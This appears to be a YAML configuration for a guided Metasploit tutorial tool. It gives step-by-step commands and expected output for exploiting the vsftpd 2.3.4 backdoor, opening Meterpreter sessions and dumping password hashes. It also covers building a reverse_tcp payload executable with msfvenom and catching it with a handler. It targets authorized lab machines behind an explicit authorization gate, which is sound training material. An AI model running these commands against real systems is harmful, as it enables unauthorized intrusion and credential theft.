tool_id: metasploit
display_name: "Metasploit Framework"
binary_candidates: [msfconsole, msfvenom]
categories: [exploitation, post_exploitation]
os_profile: kali
one_liner: "A framework to find, configure, and launch exploits + manage post-exploitation, against authorized targets."
authorization_gate: true
authorization_text: >
  Metasploit launches real exploits and grants real access. Using it against systems you do
  not own or lack explicit written permission to test is a serious crime. Continue only for
  authorized targets. Practice on Metasploitable 2/3, your own VMs, HackTheBox, TryHackMe,
  VulnHub. Continue?
flows:
  - flow_id: guided
    title: "Guided first exploit (START HERE)"
    goal: "From a legal target to a live session — the msfconsole workflow, each input explained."
    command_builder_id: msfconsole
    slots: [PROGRAM, GLOBAL_OPTIONS, ACTION_OPTIONS]
    steps:
      - step_id: g1
        title: "Set up a legal practice target + start the database"
        slot_target: null
        glossary_refs: [framework, msfdb]
        explanation:
          what: "Metasploit fires REAL exploits, so you practise against a deliberately-vulnerable target you control. Its database (PostgreSQL) stores the hosts, services and loot you find."
          why: "You must never point this at a system you're not authorized to test. The DB is optional but makes an engagement far easier to organise."
          where: "System setup, before you open the console."
        find_it: >
          Free legal targets: Metasploitable 2 or 3 (a purpose-built vulnerable VM), or
          HackTheBox / TryHackMe machines. Download Metasploitable, run it in VirtualBox on a
          host-only network, and note its IP. Then start the database as shown.
        command_anatomy:
          - {token: "sudo systemctl start postgresql", does: "start the PostgreSQL database service"}
          - {token: "sudo msfdb init", does: "create Metasploit's database"}
        try_this: "sudo systemctl start postgresql && sudo msfdb init"
        success_criteria: "It reports the database was created/initialised with no errors."
        expected_output: |
          [+] Starting database
          [+] Creating database user 'msf'
          [+] Creating databases 'msf'
          [+] Database initialization successful
        alternatives:
          - trigger: "msfdb: command not found or DB errors"
            cause: "Metasploit/PostgreSQL not fully installed."
            fix: "Install/repair: `sudo apt update && sudo apt install metasploit-framework`; see the Services troubleshooter for PostgreSQL."
            check: "msfdb init completes."
      - step_id: g2
        title: "Open the console and confirm the database"
        slot_target: ACTION_OPTIONS
        glossary_refs: [msfdb, datastore]
        explanation:
          what: "`msfconsole` is the main interface. `-q` starts it quietly; `db_status` confirms it's connected to PostgreSQL."
          why: "Confirming the DB now avoids surprises later when you want to store scan results and loot."
          where: "-x runs commands then drops you at the msf prompt."
        find_it: "No input needed. Inside the console the prompt looks like `msf6 >`. Type `exit` to leave."
        command_anatomy:
          - {token: "msfconsole", does: "launch the Metasploit console"}
          - {token: "-q", does: "quiet — skip the banner"}
          - {token: "-x \"db_status\"", does: "run db_status on startup"}
        try_this: "msfconsole -q -x \"db_status\""
        success_criteria: "It prints that it's connected to the msf database."
        expected_output: |
          [*] Connected to msf. Connection type: postgresql.
          msf6 >
        alternatives:
          - trigger: "db_status shows not connected"
            cause: "PostgreSQL isn't running or the DB wasn't initialised."
            fix: "Run step 1 again: start postgresql, `sudo msfdb reinit`."
            check: "db_status says connected."
      - step_id: g3
        title: "Find an exploit for a known weakness"
        slot_target: ACTION_OPTIONS
        glossary_refs: [module_types, exploit]
        explanation:
          what: "`search` finds modules; `use <n>` selects one; `show options` lists what you must configure. Metasploitable's vsftpd 2.3.4 has a famous backdoor — a safe, reliable first exploit."
          why: "You pick an exploit that matches a service/version you found during recon (with the nmap tool)."
          where: "These are console commands run in sequence."
        find_it: >
          Run nmap against your target first (`nmap -sV <target>`) to see service versions. Then
          search Metasploit for that software or its CVE. For this walk-through we use the
          well-known vsftpd 2.3.4 backdoor on Metasploitable.
        command_anatomy:
          - {token: "search type:exploit name:vsftpd", does: "find vsftpd exploit modules"}
          - {token: "use exploit/unix/ftp/vsftpd_234_backdoor", does: "select that module"}
          - {token: "show options", does: "list the settings you must fill in"}
        try_this: "msfconsole -q -x \"use exploit/unix/ftp/vsftpd_234_backdoor; show options\""
        success_criteria: "The prompt changes to the module and shows an options table (RHOSTS is required and blank)."
        expected_output: |
          [*] Using exploit/unix/ftp/vsftpd_234_backdoor
          Name    Current Setting  Required  Description
          ----    ---------------  --------  -----------
          RHOSTS                   yes       The target host(s)
          RPORT   21               yes       The target port
        alternatives:
          - trigger: "search returns too many / nothing"
            cause: "Terms too broad or misspelled."
            fix: "Add filters: `search type:exploit platform:unix name:vsftpd`, or search by CVE: `search cve:2011-2523`."
            check: "You can `use` a specific module path."
      - step_id: g4
        title: "Configure the exploit (RHOSTS = target, LHOST = you)"
        slot_target: ACTION_OPTIONS
        glossary_refs: [rhosts_lhost, payload]
        explanation:
          what: "`set RHOSTS <target-ip>` tells it who to attack. Reverse payloads also need `set LHOST <your-ip>` (where the target connects BACK to) and `set LPORT`. `check` tests without firing where supported."
          why: "The #1 beginner mistake is LHOST — it must be YOUR machine's IP on the network the target can reach, not the target's."
          where: "Console `set` commands; values live in the module's datastore."
        find_it: >
          RHOSTS = your target VM's IP. LHOST = YOUR Kali IP — find it with `ip a` (the inet
          line on the interface facing the target, e.g. 10.0.0.5). This vsftpd module opens a
          shell directly, so it doesn't need LHOST; most reverse exploits do.
        command_anatomy:
          - {token: "set RHOSTS 10.0.0.20", does: "the target to attack"}
          - {token: "set LHOST 10.0.0.5", does: "YOUR IP (for reverse payloads) — from `ip a`"}
          - {token: "check", does: "test whether the target looks vulnerable (if supported)"}
        try_this: "msfconsole -q -x \"use exploit/unix/ftp/vsftpd_234_backdoor; set RHOSTS 10.0.0.20; show options\""
        success_criteria: "RHOSTS now shows your target and no required option is blank."
        expected_output: |
          RHOSTS  10.0.0.20  yes  The target host(s)
          Payload options (cmd/unix/interact): (none required)
        alternatives:
          - trigger: "'missing required option'"
            cause: "A required datastore value (often RHOSTS or LHOST) is still blank."
            fix: "Run `show options` and `set` each blank required field."
            check: "show options shows no empty required rows."
          - trigger: "you're not sure which IP is LHOST"
            cause: "Confusing your IP with the target's."
            fix: "Run `ip a`; LHOST is YOUR address on the same network as the target (starts the same, e.g. 10.0.0.x)."
            check: "LHOST is your Kali IP."
      - step_id: g5
        title: "Run the exploit"
        slot_target: ACTION_OPTIONS
        glossary_refs: [session, job]
        explanation:
          what: "`exploit` (or `run`) fires the module. On success you get a session — a foothold on the target."
          why: "This is the payoff: a working session means the vulnerability was real and exploitable."
          where: "Console `exploit` command; add -j to background a listener."
        find_it: "No new input — everything was set in step 4. Just run it."
        command_anatomy:
          - {token: "use exploit/unix/ftp/vsftpd_234_backdoor", does: "the module"}
          - {token: "set RHOSTS 10.0.0.20", does: "the target"}
          - {token: "exploit", does: "launch the exploit"}
        try_this: "msfconsole -q -x \"use exploit/unix/ftp/vsftpd_234_backdoor; set RHOSTS 10.0.0.20; exploit\""
        success_criteria: "It reports a session opened (a command shell or Meterpreter)."
        expected_output: |
          [+] Backdoor service has been spawned, handling...
          [+] UID: uid=0(root) gid=0(root)
          [*] Command shell session 1 opened (10.0.0.5 -> 10.0.0.20:6200)
        alternatives:
          - trigger: "Exploit completed, but no session was created"
            cause: "Wrong target/payload, host already patched, or LHOST/port/firewall wrong."
            fix: "Confirm the version with `nmap -sV`; verify LHOST is your IP; check no firewall blocks the callback port."
            check: "nmap confirms the vulnerable service; LHOST/LPORT are correct."
          - trigger: "connection refused / unreachable"
            cause: "Target IP wrong or not routable from Kali."
            fix: "Ping/nmap the target; make sure both VMs are on the same host-only network."
            check: "You can reach the target with nmap."
      - step_id: g6
        title: "Interact with your session"
        slot_target: ACTION_OPTIONS
        glossary_refs: [meterpreter, session]
        explanation:
          what: "`sessions -l` lists sessions; `sessions -i <id>` drops you into one. In a shell try `id`/`whoami`; in Meterpreter try `sysinfo`, `getuid`, `hashdump`."
          why: "This is where you confirm and use your access. `hashdump` output feeds the john/hashcat tools for offline cracking."
          where: "Console `sessions` command; then the session's own commands."
        find_it: "Use the session id from step 5 (usually 1). `background` returns you to the console; `exit` closes the session."
        command_anatomy:
          - {token: "sessions -l", does: "list open sessions"}
          - {token: "sessions -i 1", does: "interact with session 1"}
          - {token: "(then) id / sysinfo / getuid", does: "confirm who and where you are"}
        try_this: "msfconsole -q -x \"sessions -l\"   # then: sessions -i 1  ->  id"
        success_criteria: "You land in the session and commands return data (e.g. uid=0(root))."
        expected_output: |
          Active sessions
          Id  Type         Information  Connection
          1   shell cmd/unix            10.0.0.5 -> 10.0.0.20:6200
          $ id
          uid=0(root) gid=0(root)
        alternatives:
          - trigger: "the session dies quickly"
            cause: "The host process it rode is unstable."
            fix: "In Meterpreter, `ps` then `migrate <pid>` into a stable process."
            check: "The session stays alive after migrate."
          - trigger: "no sessions listed"
            cause: "The exploit didn't actually land."
            fix: "Go back to steps 4-5; re-check options and target reachability."
            check: "exploit reports a session opened."
  - flow_id: setup_db
    title: "Setup & database (reference)"
    goal: "Start PostgreSQL so the console can store hosts/loot."
    command_builder_id: msfconsole
    slots: [PROGRAM, GLOBAL_OPTIONS, ACTION_OPTIONS]
    steps:
      - step_id: ms1
        title: "Init the DB and check db_status"
        slot_target: ACTION_OPTIONS
        glossary_refs: [framework, msfdb, datastore]
        explanation:
          what: "`sudo systemctl start postgresql` -> `sudo msfdb init` -> in console `db_status` (expect connected)."
          why: "The DB stores hosts/services/loot (optional but very useful)."
          where: "System + console grammar (step 0)."
        find_it: "Just system access; run before opening the console."
        command_anatomy:
          - {token: "systemctl start postgresql", does: "start the database service"}
          - {token: "msfdb init", does: "create Metasploit's DB"}
          - {token: "db_status", does: "(in console) confirm connection"}
        try_this: "sudo systemctl start postgresql && sudo msfdb init   # then msfconsole -q -x \"db_status\""
        success_criteria: "db_status shows connected."
        expected_output: |
          [*] Connected to msf. Connection type: postgresql.
        alternatives:
          - trigger: "not connected"
            cause: "PostgreSQL not running or DB not initialised."
            fix: "Start/enable postgresql; re-run msfdb init (or msfdb reinit)."
            check: "See the Services troubleshooter for PostgreSQL."
  - flow_id: search_use
    title: "Find & select a module (reference)"
    goal: "Search and select a module, then inspect it."
    command_builder_id: msfconsole
    slots: [PROGRAM, GLOBAL_OPTIONS, ACTION_OPTIONS]
    steps:
      - step_id: ms2
        title: "search -> use -> show options"
        slot_target: ACTION_OPTIONS
        glossary_refs: [module_types, exploit]
        explanation:
          what: "`search type:exploit name:eternalblue`, then `use <n|path>`; inspect with info / show options / show payloads / show targets."
          why: "Console grammar step 1-2: SELECT then INSPECT."
          where: "ACTION_OPTIONS (-x script)."
        find_it: "A service/version or CVE from recon to search for."
        command_anatomy:
          - {token: "search type:exploit name:eternalblue", does: "find matching exploit modules"}
          - {token: "use 0", does: "select result number 0"}
          - {token: "show options", does: "list settings to configure"}
        try_this: "msfconsole -q -x \"search type:exploit name:eternalblue; use 0; show options\""
        success_criteria: "The prompt changes to the module; show options lists what to set."
        expected_output: |
          [*] Using exploit/windows/smb/ms17_010_eternalblue
          RHOSTS  (blank)  yes  The target host(s)
        alternatives:
          - trigger: "too many results"
            cause: "Search too broad."
            fix: "Add filters (type/platform/cve/rank)."
            check: "Re-search with more filters."
          - trigger: "nothing found"
            cause: "Wrong terms/spelling."
            fix: "Broaden or correct the search terms."
            check: "Try a CVE filter."
  - flow_id: configure_run
    title: "Configure & run an exploit (reference)"
    goal: "Set the datastore and fire."
    command_builder_id: msfconsole
    slots: [PROGRAM, GLOBAL_OPTIONS, ACTION_OPTIONS]
    steps:
      - step_id: ms3
        title: "set RHOSTS/PAYLOAD/LHOST/LPORT -> check -> exploit"
        slot_target: ACTION_OPTIONS
        glossary_refs: [rhosts_lhost, payload, job, session]
        explanation:
          what: "`set RHOSTS <target>`, `set PAYLOAD <path>`, reverse payloads need `set LHOST <your-ip>` + `set LPORT`; `setg` is global; `check` then `exploit` (-j background, -z don't interact)."
          why: "Console grammar step 3-5: CONFIGURE -> VERIFY -> RUN."
          where: "ACTION_OPTIONS (-x script)."
        find_it: "RHOSTS = target IP; LHOST = your IP from `ip a`; pick a payload from `show payloads`."
        command_anatomy:
          - {token: "set RHOSTS 10.0.0.20", does: "the target"}
          - {token: "set PAYLOAD .../reverse_tcp", does: "the payload to deliver"}
          - {token: "set LHOST 10.0.0.5", does: "your IP for the callback"}
          - {token: "check; exploit", does: "verify then launch"}
        try_this: "msfconsole -q -x \"use <exploit>; set RHOSTS 10.0.0.20; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST 10.0.0.5; set LPORT 4444; check; exploit\""
        success_criteria: "'Meterpreter session N opened' (or the exploit's success message)."
        expected_output: |
          [*] Meterpreter session 1 opened (10.0.0.5:4444 -> 10.0.0.20:49512)
        alternatives:
          - trigger: "missing required option"
            cause: "A required datastore value (often RHOSTS/LHOST) is blank."
            fix: "`show options` and set the blanks."
            check: "Re-run show options."
          - trigger: "Exploit completed, but no session was created"
            cause: "Wrong target/payload arch, host patched, or LHOST/port/firewall wrong."
            fix: "Adjust payload/target; confirm reachability with nmap; verify LHOST is your IP on the route."
            check: "nmap the target; double-check LHOST/LPORT."
  - flow_id: auxiliary
    title: "Auxiliary modules (reference)"
    goal: "Recon/enumeration without exploiting."
    command_builder_id: msfconsole
    slots: [PROGRAM, GLOBAL_OPTIONS, ACTION_OPTIONS]
    steps:
      - step_id: ms4
        title: "use auxiliary/scanner -> set RHOSTS -> run"
        slot_target: ACTION_OPTIONS
        glossary_refs: [auxiliary]
        explanation:
          what: "`use auxiliary/scanner/<…>`, `set RHOSTS <range>`, `run`; results can store in the DB."
          why: "A safe way to learn the workflow — no payload fired."
          where: "ACTION_OPTIONS (-x script)."
        find_it: "A target range for RHOSTS (e.g. 10.0.0.0/24)."
        command_anatomy:
          - {token: "use auxiliary/scanner/smb/smb_version", does: "an SMB version scanner (no exploit)"}
          - {token: "set RHOSTS 10.0.0.0/24", does: "the range to scan"}
          - {token: "run", does: "execute the scanner"}
        try_this: "msfconsole -q -x \"use auxiliary/scanner/smb/smb_version; set RHOSTS 10.0.0.0/24; run\""
        success_criteria: "Scanner results print (and store in hosts/services)."
        expected_output: |
          [*] 10.0.0.20:445 - Host is running Windows 7 (build:7601)
        alternatives:
          - trigger: "no results"
            cause: "Wrong RHOSTS range or service absent."
            fix: "Confirm the range and that the service exists (nmap)."
            check: "Re-run against a known host."
  - flow_id: sessions_meterpreter
    title: "Sessions & Meterpreter (reference)"
    goal: "Interact with an opened session."
    command_builder_id: msfconsole
    slots: [PROGRAM, GLOBAL_OPTIONS, ACTION_OPTIONS]
    steps:
      - step_id: ms5
        title: "sessions -i; meterpreter commands"
        slot_target: ACTION_OPTIONS
        glossary_refs: [meterpreter, session]
        explanation:
          what: "`sessions -l` list, `sessions -i <id>` interact, `background` to detach; in Meterpreter: sysinfo, getuid, ps, migrate <pid>, shell, download/upload, hashdump."
          why: "hashdump output feeds john/hashcat for offline cracking."
          where: "Console grammar step 6: INTERACT."
        find_it: "The session id from a successful exploit (sessions -l)."
        command_anatomy:
          - {token: "sessions -i 1", does: "interact with session 1"}
          - {token: "sysinfo / getuid / hashdump", does: "identify the host, user, and dump hashes"}
        try_this: "msfconsole -q -x \"sessions -i 1\"   # then in meterpreter: sysinfo; getuid; hashdump"
        success_criteria: "Meterpreter responds; commands return data."
        expected_output: |
          Computer: WIN-TARGET
          OS      : Windows 7
          meterpreter > getuid
          Server username: NT AUTHORITY\SYSTEM
        alternatives:
          - trigger: "session dies"
            cause: "Unstable host process."
            fix: "`migrate` to a stable process."
            check: "ps then migrate <pid>."
          - trigger: "no session"
            cause: "Exploit didn't land."
            fix: "Return to the configure/run flow."
            check: "Re-check options and reachability."
  - flow_id: post
    title: "Post-exploitation modules (reference)"
    goal: "Run after-access tasks against a session."
    command_builder_id: msfconsole
    slots: [PROGRAM, GLOBAL_OPTIONS, ACTION_OPTIONS]
    steps:
      - step_id: ms6
        title: "use post/... -> set SESSION -> run"
        slot_target: ACTION_OPTIONS
        destructive: true
        recovery: "Post modules act on a live compromised host — authorized engagements only."
        glossary_refs: [post]
        explanation:
          what: "With a session open: `use post/<platform>/<…>`, `set SESSION <id>`, `run`."
          why: "Gather creds, enumerate, or (authorized) persistence."
          where: "ACTION_OPTIONS (-x script)."
        find_it: "An open session id and a post module matching its OS."
        command_anatomy:
          - {token: "use post/windows/gather/hashdump", does: "a Windows credential-gathering module"}
          - {token: "set SESSION 1", does: "run it against session 1"}
          - {token: "run", does: "execute the post module"}
        try_this: "msfconsole -q -x \"use post/windows/gather/hashdump; set SESSION 1; run\""
        success_criteria: "The post module returns its data (e.g. dumped hashes)."
        expected_output: |
          Administrator:500:aad3b435...:31d6cfe0d16ae931b73c59d7e0c089c0:::
        alternatives:
          - trigger: "module incompatible"
            cause: "Wrong platform/session type."
            fix: "Pick a post module matching the session's OS."
            check: "sessions -l shows the platform."
  - flow_id: payloads
    title: "Payloads deep-dive (reference)"
    goal: "Choose staged/stageless and reverse/bind correctly."
    command_builder_id: msfconsole
    slots: [PROGRAM, GLOBAL_OPTIONS, ACTION_OPTIONS]
    steps:
      - step_id: ms7
        title: "staged vs stageless; reverse vs bind"
        slot_target: ACTION_OPTIONS
        glossary_refs: [staged_stageless, reverse_bind]
        explanation:
          what: "Staged uses `/` (small stager + stage); stageless uses `_` (one self-contained blob). Reverse connects back to your LHOST (NAT-friendly); bind opens a port on the target."
          why: "Reverse is the usual choice through NAT; stageless is more reliable over flaky links."
          where: "Concept; list with `show payloads` after `use <exploit>`."
        find_it: "After `use <exploit>`, run `show payloads` to see compatible options."
        command_anatomy:
          - {token: "windows/.../reverse_tcp", does: "staged (/) reverse payload — connects back to you"}
          - {token: "windows/.../reverse_tcp (with _)", does: "stageless (_) variant — one blob, more reliable"}
        try_this: "msfconsole -q -x \"use <exploit>; show payloads\""
        success_criteria: "You can pick the right payload shape for the situation."
        expected_output: |
          0  payload/windows/x64/meterpreter/reverse_tcp
          1  payload/windows/x64/meterpreter_reverse_tcp
        alternatives:
          - trigger: "unreliable connection"
            cause: "Staged payload over a flaky link."
            fix: "Try a stageless payload (underscore variant)."
            check: "Compare reliability."
  - flow_id: msfvenom
    title: "msfvenom (standalone payload generator) (reference)"
    goal: "Generate a payload file."
    command_builder_id: msfvenom
    slots: [PROGRAM, ACTION_OPTIONS, OUTPUT_OPTIONS]
    steps:
      - step_id: ms8
        title: "Build a reverse_tcp exe"
        slot_target: ACTION_OPTIONS
        destructive: true
        recovery: "A generated payload is real malware on disk — handle only in an authorized lab; encoders are NOT reliable AV evasion."
        glossary_refs: [msfvenom, staged_stageless, reverse_bind]
        explanation:
          what: "`-p <payload> LHOST= LPORT= -f <format> -o <file>`; -e encoder / -b badchars / -a arch / --platform shape it."
          why: "Creates a deliverable payload; you then catch it with multi/handler."
          where: "-p + datastore in ACTION; -f/-o in OUTPUT."
        find_it: "LHOST = your IP (`ip a`); pick a format matching the target OS (exe for Windows, elf for Linux)."
        command_anatomy:
          - {token: "-p windows/x64/meterpreter/reverse_tcp", does: "the payload to generate"}
          - {token: "LHOST=10.0.0.5 LPORT=4444", does: "where it calls back to (your IP/port)"}
          - {token: "-f exe", does: "output format (exe for Windows)"}
          - {token: "-o shell.exe", does: "write the payload to this file"}
        try_this: "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=4444 -f exe -o shell.exe"
        success_criteria: "shell.exe is written."
        expected_output: |
          [-] No platform was selected, choosing Msf::Module::Platform::Windows
          Payload size: 510 bytes
          Saved as: shell.exe
        alternatives:
          - trigger: "unknown format/payload"
            cause: "Typo or unsupported value."
            fix: "List options: --list formats / --list payloads."
            check: "Re-run with a listed value."
  - flow_id: handler
    title: "multi/handler (catch the callback) (reference)"
    goal: "Listen for a reverse payload."
    command_builder_id: msfconsole
    slots: [PROGRAM, GLOBAL_OPTIONS, ACTION_OPTIONS]
    steps:
      - step_id: ms9
        title: "Set up the listener"
        slot_target: ACTION_OPTIONS
        glossary_refs: [handler, job]
        explanation:
          what: "`use exploit/multi/handler`, `set PAYLOAD <same as msfvenom>`, `set LHOST`, `set LPORT`, `exploit -j` (background)."
          why: "A reverse payload needs a matching listener to connect back to."
          where: "ACTION_OPTIONS (-x script)."
        find_it: "Use the EXACT payload, LHOST and LPORT you gave msfvenom — they must match."
        command_anatomy:
          - {token: "use exploit/multi/handler", does: "the generic listener module"}
          - {token: "set PAYLOAD .../reverse_tcp", does: "must match the payload you generated"}
          - {token: "set LHOST/LPORT", does: "must match msfvenom's values"}
          - {token: "exploit -j", does: "start the listener as a background job"}
        try_this: "msfconsole -q -x \"use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST 10.0.0.5; set LPORT 4444; exploit -j\""
        success_criteria: "The listener starts as a background job."
        expected_output: |
          [*] Started reverse TCP handler on 10.0.0.5:4444
        alternatives:
          - trigger: "no callback"
            cause: "Payload LHOST/LPORT don't match the handler, or routing/firewall blocks it."
            fix: "Make payload and handler LHOST/LPORT identical; check routing/firewall."
            check: "Compare msfvenom LHOST/LPORT to the handler."
  - flow_id: workflow_db
    title: "Workflow aids (reference)"
    goal: "Organize an engagement in the DB."
    command_builder_id: msfconsole
    slots: [PROGRAM, GLOBAL_OPTIONS, ACTION_OPTIONS]
    steps:
      - step_id: ms10
        title: "workspaces, db_nmap, hosts/services"
        slot_target: ACTION_OPTIONS
        glossary_refs: [workspace, datastore]
        explanation:
          what: "`workspace -a <name>` isolates engagements; `db_nmap <args>` scans+stores; `db_import <xml>`; review with hosts/services/vulns/creds/loot; automate with resource <file.rc> / makerc."
          why: "Keeps findings organized and repeatable."
          where: "ACTION_OPTIONS (-x script)."
        find_it: "A workspace name and a target range; requires the DB connected (setup flow)."
        command_anatomy:
          - {token: "workspace -a lab", does: "create/switch to a 'lab' workspace"}
          - {token: "db_nmap -sV 10.0.0.0/24", does: "run nmap and store results in the DB"}
          - {token: "hosts; services", does: "review discovered hosts and services"}
        try_this: "msfconsole -q -x \"workspace -a lab; db_nmap -sV 10.0.0.0/24; hosts; services\""
        success_criteria: "Scan results are stored and listed by hosts/services."
        expected_output: |
          Hosts
          address     os_name    name
          10.0.0.20   Linux      metasploitable
        alternatives:
          - trigger: "db_nmap not found"
            cause: "DB not connected."
            fix: "Set up the DB first (setup flow)."
            check: "db_status connected."
  - flow_id: maintenance
    title: "Maintenance / updating (reference, Kali)"
    goal: "Update Metasploit the Kali way."
    command_builder_id: msfconsole
    slots: [PROGRAM]
    steps:
      - step_id: ms11
        title: "Update via apt on Kali"
        slot_target: null
        explanation:
          what: "On Kali, update via apt: `sudo apt update && sudo apt install metasploit-framework` (not msfupdate)."
          why: "Kali packages Metasploit; apt keeps it consistent with the distro."
          where: "System maintenance (concept)."
        find_it: "Just needs internet + apt working."
        command_anatomy:
          - {token: "sudo apt update", does: "refresh package lists"}
          - {token: "sudo apt install metasploit-framework", does: "upgrade Metasploit the Kali way"}
        try_this: "sudo apt update && sudo apt install metasploit-framework"
        success_criteria: "Metasploit updates to the packaged version."
        expected_output: |
          metasploit-framework is already the newest version (...)
        alternatives:
          - trigger: "apt errors"
            cause: "Package/keyring issues."
            fix: "See the Packages/keys/certs troubleshooter."
            check: "Resolve apt first, then retry."

quick_build:
  builder: msfvenom
  title: "Generate payload"
  fields:
    - field_id: payload
      label: "Payload"
      type: string
      required: true
      placeholder: "windows/x64/meterpreter/reverse_tcp"
    - field_id: lhost
      label: "LHOST"
      type: string
      placeholder: "10.0.0.5"
    - field_id: lport
      label: "LPORT"
      type: int
      placeholder: "4444"
    - field_id: format
      label: "Format (-f)"
      type: string
      placeholder: "exe, elf, raw, python"
    - field_id: outfile
      label: "Output file (-o)"
      type: path
      placeholder: "payload.exe"
